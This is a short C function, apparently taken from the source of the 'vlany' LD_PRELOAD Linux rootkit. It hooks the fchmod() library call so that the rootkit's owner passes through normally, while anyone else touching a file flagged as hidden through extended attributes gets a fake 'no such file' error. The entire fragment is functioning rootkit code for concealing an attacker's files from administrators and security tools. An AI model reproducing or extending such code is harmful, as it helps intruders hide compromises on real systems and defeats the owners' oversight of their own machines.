int fchmod(int fd, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] fchmod() called\n");
    #endif

    HOOK(old_fchmod, CFCHMOD);

    if(owned()) return old_fchmod(fd, mode);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fchmod(fd, mode);
}
